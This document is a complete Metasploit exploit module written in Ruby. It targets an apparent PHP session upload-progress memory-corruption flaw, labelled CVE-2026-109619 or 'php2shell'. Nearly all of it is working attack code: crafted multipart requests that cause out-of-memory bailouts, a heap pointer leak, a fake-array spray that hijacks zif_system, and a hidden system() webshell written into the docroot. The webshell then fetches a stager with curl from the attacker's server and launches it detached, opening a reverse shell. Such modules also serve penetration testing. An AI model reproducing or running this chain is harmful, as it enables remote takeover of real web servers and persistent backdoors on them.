##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  BOUNDARY = 'CCCCCCCCCC'
  QPARAMS = '?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v'
  FAKE_LEN = 0xC8000
  MAIN_BUCKET_COUNT = 87
  CMD_LIMIT = 200 # 0x160 - 0x98 carrier limit
  ZDTOR_OFF_DEFAULT = 0x3d1eb0 # php-8.2.12 NTS aarch64 native build, libphp.so
  ZIF_OFF_DEFAULT = 0x301440   # zif_system (local symbol)
  S_OFF_DEFAULT = 0xea9fd8     # ps_globals RVA (.bss): S = libphp_base + S_OFF

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PHP session upload progress multipart OOB (php2shell)',
        'Description' => %q{
          CVE-2026-109619: php_session_rfc1867_callback runs before RINIT and
          decodes the session upload progress key without destroying the
          unserialize context on bailout. An OOM in the multipart parser
          leaves a dangling BG(unserialize)/BG(serialize) context in the
          worker; the next request on the same worker reuses the freed
          context, yielding an OOB write that is steered into a fake
          zend_array whose pDestructor is zif_system.

          This module fires the full chain (A1 send_cookie OOM, B1 heap
          leak via forged zend_string length, A2 reclaim, B2 fake-reference
          spray), plants a minimal system() webshell in the docroot, then
          uses it to fetch and launch the staged payload (php/meterpreter)
          detached, opening a session.
        },
        'License' => MSF_LICENSE,
        'Author' => ['operator'],
        'References' => [
          ['CVE', '2026-109619'],
          ['CVE', '2026-109618'],
          ['URL', 'https://calif.io/php2shell/']
        ],
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [['php2shell chain', {}]],
        'DefaultTarget' => 0,
        'Payload' => { 'BadChars' => "\x00" },
        'DefaultOptions' => { 'PAYLOAD' => 'php/reverse_php' },
        'DisclosureDate' => '2026-10-01',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_RESTARTS],
          'SideEffects' => [],
          'AKA' => ['php2shell']
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'PHP endpoint (any routed .php)', '/index.php']),
      OptString.new('DOCROOT', [true, 'HTTP docroot on the victim', '/var/www/html']),
      OptInt.new('ZDTOR_OFF', [false, 'zval_ptr_dtor offset in libphp', ZDTOR_OFF_DEFAULT]),
      OptInt.new('ZIF_OFF', [false, 'zif_system offset in libphp', ZIF_OFF_DEFAULT]),
      OptInt.new('S_OFF', [false, 'ps_globals offset in libphp (S = base + S_OFF)', S_OFF_DEFAULT]),
      OptInt.new('CHAIN_RETRIES', [false, 'full-chain retries', 3]),
      OptInt.new('STAGER_RETRIES', [false, 'stager launch retries', 3])
    ])
  end

  # ---------------------------------------------------------------- builders

  def part(name, value)
    "--#{BOUNDARY}\r\nContent-Disposition: form-data; name=\"#{name}\"\r\n\r\n#{value}\r\n"
  end

  def nest_name(i, depth, key_pad)
    (format('files[R%05d%s]', i, 'K' * key_pad)) + ('[a]' * (depth - 2))
  end

  # A1: END-cleanup send_cookie OOM (chunked bypasses post_max_size)
  def build_a1
    out = +''
    out << part('PHPSESSID', "\x00")
    860.times do |i|
      ctype = i.zero? ? 'C' * 103 : (i == 1 ? 'C' * 231 : 'application/octet-stream')
      fn = i < 2 ? 'A' : ''
      out << "--#{BOUNDARY}\r\nContent-Disposition: form-data; " \
             "name=\"#{nest_name(i, 64, 90)}\"; filename=\"#{fn}\"\r\n" \
             "Content-Type: #{ctype}\r\n\r\n"
    end
    14.times { |i| out << part(format('f%04d', i).ljust(103, 'x')[0, 103], 'v' * 8) }
    78.times { |i| out << part(format('b%04d', i), 'B' * 8000) }
    20.times { |i| out << part(format('u%02d', i), 'U' * 4000) }
    out << part('PHP_SESSION_UPLOAD_PROGRESS', 'k' * 4000)
    out << "--#{BOUNDARY}--\r\n"
    out
  end

  def forge_fill_value(pages, page, idx)
    len = pages * 4096 - 25
    v = +'A' * len
    hdr = page * 0x1000 - 0x1018
    return v unless hdr >= 0 && hdr + 0x18 + 8 <= len

    v[hdr, 4] = [0].pack('V')
    v[hdr + 4, 4] = [0x16].pack('V')
    v[hdr + 8, 8] = [0].pack('Q<')
    v[hdr + 0x10, 8] = [FAKE_LEN].pack('Q<')
    v[hdr + 0x18, 8] = format('/%02dBBBBB', idx % 100)
    v
  end

  # B1: id-page forged zend_string => OOB read of main-heap pointers
  def build_b1
    out = +''
    out << part('PHPSESSID', 'a')
    out << part('PHP_SESSION_UPLOAD_PROGRESS', 'k0')
    idx = 0
    spec = [['G', 511, 0x137]] * 14 + [['G', 400, 0x137], ['G', 511, 0x137]]
    spec.each do |(_kind, pages, page)|
      v = forge_fill_value(pages, page, idx)
      out << part(format('f%04d', idx).ljust(120, 'f')[0, 120], v)
      idx += 1
    end
    900.times do
      out << part(format('x%05d', idx) + ('[a]' * 12), 'v')
      idx += 1
    end
    out << "--#{BOUNDARY}--\r\n"
    out
  end

  # A2: cheap parser OOM that reclaims the leak chunk (dangling PS(id))
  def build_a2
    out = +''
    out << part('PHPSESSID', 'a' * 32)
    out << part('PHP_SESSION_UPLOAD_PROGRESS', 'k0')
    115.times { |i| out << part(format('%03d', i), 'x') }
    880.times do |i|
      out << "--#{BOUNDARY}\r\nContent-Disposition: form-data; " \
             "name=\"#{nest_name(i, 64, 0)}\"; filename=\"\"\r\n" \
             "Content-Type: application/octet-stream\r\n\r\n"
    end
    out << "--#{BOUNDARY}--\r\n"
    out
  end

  def fake_ref(ptr, rc, val_type)
    rv = +"\x00" * 32
    rv[0, 4] = [rc].pack('V')
    rv[4] = "\x0a"
    rv[8, 8] = [ptr].pack('Q<')
    rv[16, 4] = [val_type].pack('V')
    rv
  end

  def make_spray(ptr)
    v = +'S' * 384
    off = 8
    while off + 32 <= 384
      v[off, 32] = fake_ref(ptr, 1, 0x0107)
      off += 32
    end
    v
  end

  def make_name(prefix, i)
    (prefix + format('%09d', i)).ljust(10, 'x')[0, 10]
  end

  # fake zend_array (pDestructor = zif_system) + execute_data + arg string
  def mk_ht(htdata, zif, cmd)
    ht = +"\x00" * 384
    ht[0x00, 8] = [1, 7].pack('VV')
    ht[0x08, 8] = [0x10, 0xFFFFFFF8].pack('VV')
    ht[0x10, 8] = [htdata + 0x20].pack('Q<')
    ht[0x18, 8] = [1, 1].pack('VV')
    ht[0x20, 8] = [8, 0].pack('VV')
    ht[0x30, 8] = [zif].pack('Q<') # pDestructor = zif_system
    e = 0x20
    ht[e + 0x10, 8] = [zif].pack('Q<')          # return_value
    ht[e + 0x2C, 4] = [1].pack('V')             # num_args
    ht[e + 0x50, 8] = [htdata + 0x80].pack('Q<') # arg1 zval ptr
    ht[e + 0x58, 4] = [6].pack('V')             # arg1 IS_STRING
    ht[0x80, 8] = [1, 0x106].pack('VV')         # zend_string gc
    ht[0x88, 8] = [0].pack('Q<')                # h
    ht[0x90, 8] = [cmd.bytesize].pack('Q<')     # len
    ht[0x98, cmd.bytesize] = cmd
    ht
  end

  # B2: fake-reference spray steering var_push_dtor into the fake array
  def build_b2(htdata, zif, cmd)
    spray = make_spray(htdata)
    ht = mk_ht(htdata, zif, cmd)
    out = +''
    500.times { |i| out << part(make_name('s', i), spray) }
    out << part('ht', ht)
    out << part('PHPSESSID', 'a' * 32)
    out << part('PHP_SESSION_UPLOAD_PROGRESS', 'k0')
    495.times { |i| out << part(make_name('t', i), spray) }
    out << "--#{BOUNDARY}--\r\n"
    out
  end

  # ------------------------------------------------------------------- leak

  def parse_leak(set_cookie, body)
    m = set_cookie.index('PHPSESSID=')
    raw = m ? set_cookie[m + 10..] : set_cookie
    raw = raw.split(';').first.to_s.split(',').first.to_s
    dec = raw.tr('+', ' ').gsub(/%([0-9A-Fa-f]{2})/) { Regexp.last_match(1).to_i(16).chr }
    dec = dec.b

    counts = Hash.new(0)
    (0...(dec.bytesize - 8)).each do |off|
      q = dec[off, 8].unpack1('Q<')
      counts[q] += 1 if (q >= 0x7f0000000000 && q <= 0x7fffffffffff) ||
                        (q >= 0x0000ffff00000000 && q <= 0x0000ffffffffffff)
    end
    fail_with(Failure::NotFound, "no mmap pointers in #{dec.bytesize}B window") if counts.empty?

    zdtor_off = datastore['ZDTOR_OFF']
    zdtor = nil
    counts.sort_by { |_q, c| -c }.first(8).each do |q, c|
      next unless c >= 100 && ((q - zdtor_off) & 0xFFF).zero?

      zdtor = q
      break
    end
    fail_with(Failure::NotFound, format('no pointer matches zdtor_off %#x', zdtor_off)) unless zdtor

    lib = zdtor - zdtor_off
    buckets = Hash.new(0)
    counts.each { |q, c| buckets[q & 0xFFFFFFFFFFE00000] += c }
    lib_bucket = zdtor & 0xFFFFFFFFFFE00000
    id_bucket = buckets.max_by { |_b, c| c }[0]
    cands = buckets.reject { |b, _c| [lib_bucket, id_bucket].include?(b) }
                   .sort_by { |_b, c| [(c - MAIN_BUCKET_COUNT).abs, c] }
                   .first(3)
    { lib: lib, zdtor: zdtor, cands: cands }
  end

  # ------------------------------------------------------------------ chain

  def post(path, body, chunked)
    uri = path.start_with?('/') ? path : normalize_uri(target_uri.path) + path
    opts = {
      'method' => 'POST',
      'uri' => uri,
      'ctype' => "multipart/form-data; boundary=#{BOUNDARY}",
      'data' => body
    }
    opts['chunked_size'] = 65536 if chunked
    begin
      send_request_cgi(opts)
    rescue StandardError
      nil
    end
  end

  def fire_chain(cmd)
    res = post(QPARAMS, build_a1, true)
    return nil, 'A1 no OOM' unless res.nil? || res.code == 500

    res = post('', build_b1, true)
    return nil, 'B1 no response' if res.nil? || res.headers['Set-Cookie'].to_s.empty?

    begin
      leak = parse_leak(res.headers['Set-Cookie'], res.body.to_s)
    rescue Msf::Exploit::Failed => e
      return nil, "B1 leak: #{e.msg}"
    end
    zif = leak[:lib] + datastore['ZIF_OFF']

    leak[:cands].each do |main, _count|
      delta = leak[:lib] - main
      next unless delta >= 0x800000 && delta <= 0x80000000

      s = leak[:lib] + datastore['S_OFF']
      print_status(format('leak ok: lib=%#x main=%#x S=%#x zif=%#x', leak[:lib], main, s, zif))
      post('', build_a2, false)
      sleep(0.2)
      post('', build_b2(s, zif, cmd), false)
      sleep(0.6)
      return [s, zif], 'FIRED'
    end
    [nil, 'B1 candidates rejected']
  end

  # ------------------------------------------------------------- webshell io

  def wsh(cmd)
    res = post("/#{@ws_name}?c=#{Rex::Text.uri_encode(cmd)}", '', false)
    res && res.code == 200 ? res.body.to_s : nil
  rescue StandardError
    nil
  end

  def check
    res = post('', part('a', 'v') + "--#{BOUNDARY}--\r\n", false)
    return CheckCode::Unknown('no response') if res.nil?

    CheckCode::Safe('endpoint did not answer multipart POST')
  rescue StandardError => e
    CheckCode::Unknown(e.to_s)
  end

  # ---------------------------------------------------------------- exploit

  def on_request_uri(cli, req)
    print_status("payload requested (#{req.uri})")
    send_response(cli, payload.encoded, 'Content-Type' => 'application/octet-stream')
  end

  def exploit
    @ws_name = ".#{Rex::Text.rand_text_alphanumeric(8)}.php"
    ws_path = "#{datastore['DOCROOT']}/#{@ws_name}"
    stager_name = "#{Rex::Text.rand_text_alphanumeric(10)}.php"
    stager_path = "#{datastore['DOCROOT']}/#{stager_name}"

    cmd = "printf %s '<?php system($_GET[\"c\"]); ?>' >#{ws_path}"
    fail_with(Failure::BadConfig, 'cmd too long') if cmd.bytesize > CMD_LIMIT

    start_service('Uri' => {
                    'Proc' => method(:on_request_uri),
                    'Mount' => "/#{stager_name}"
                  })
    srv = get_uri
    print_status("payload served at #{srv}")
    print_status("planting webshell #{ws_path}")

    info = nil
    datastore['CHAIN_RETRIES'].times do |i|
      info, stage = fire_chain(cmd)
      print_status("chain try #{i + 1}: #{stage}")
      break if stage == 'FIRED'
    end
    unless info
      print_error('chain did not fire; aborting')
      stop_service
      return
    end

    out = wsh('id')
    unless out.to_s =~ /uid=/
      print_error('webshell not responding after fire')
      stop_service
      return
    end
    print_good("webshell alive (#{out[/uid=[^(\s]+/]})")

    deploy = "curl -so #{stager_path} #{srv}"
    out = wsh(deploy)
    unless wsh("test -s #{stager_path} && echo DEPLOY_OK").to_s.include?('DEPLOY_OK')
      print_error('stager deploy failed (curl missing on victim?)')
      stop_service
      return
    end
    print_good("stager deployed: #{stager_path}")

    datastore['STAGER_RETRIES'].times do
      wsh("setsid php #{stager_path} >/dev/null 2>&1 </dev/null &")
      print_status('stager launched detached; waiting for session...')
      (0..30).each do
        break if framework.sessions.count.positive?

        sleep 1
      end
      break if framework.sessions.count.positive?
    end
    stop_service unless framework.sessions.count.positive?
  end
end
